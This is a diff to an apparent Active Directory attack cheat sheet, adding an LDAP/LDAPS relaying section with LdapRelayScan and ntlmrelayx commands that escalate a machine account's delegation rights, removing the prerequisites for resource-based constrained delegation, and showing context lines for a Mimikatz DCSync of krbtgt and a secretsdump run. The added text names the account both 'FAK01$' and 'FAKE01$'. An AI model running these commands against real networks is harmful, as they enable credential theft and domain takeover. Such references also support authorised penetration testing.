@@ -33,6 +33,7 @@
     * [Change-Lockscreen](#Change-Lockscreen)
 * [Relaying attacks](#Relaying-attacks)
   * [SMB Relaying](#SMB-Relaying) 
+  * [LDAP Relaying](#LDAP-Relaying) 
 * [MS Exchange](#MS-Exchange) 
   * [Attacking externally](#Attacking-externally)
   * [Attacking from the inside](#Attacking-from-the-inside)
@@ -759,11 +760,6 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 ```
 
 ### Resource Based Constrained Delegation
-- Need two privileges:
-  - One, control over an object which has SPN configured 
-    - (like admin access to a domain joined machine or ability to join a machine to domain - ms-DS-MachineAccountQuota is 10 for all domain users)
-  − Two, Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.  
-
 ### Computer object takeover
 - Requirements:
   - An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
@@ -1069,6 +1065,23 @@ proxychains python3 secretsdump.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGE
 
 # Also possible to access shares on the network, for example if user is not local admin
 proxychains python3 smbclient.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
+```
+
+### LDAP(s) Relaying
+- When relaying to LDAP check if signing isn't required
+- When relaying to LDAPS check if binding isn't required
+
+#### Check binding and signing
+- https://github.com/zyn3rgy/LdapRelayScan
+```
+python3 LdapRelayScan.py -method BOTH -dc-ip <IP> -u <USER> -p <PASSWORD>
+```
+
+#### Start NTLMRelay
+- Requires a computeraccount created (in example FAK01$). See more info on relaying to LDAP in the Resource Based Constrained Delegation section.
+```
+sudo ntlmrelayx.py -t ldap://<DC IP> --http-port 8080 --delegate-access --escalate-user FAKE01$
+sudo ntlmrelayx.py -t ldaps://<DC IP> --http-port 8080 --delegate-access --escalate-user FAKE01$
 ```
 
 ## MS Exchange
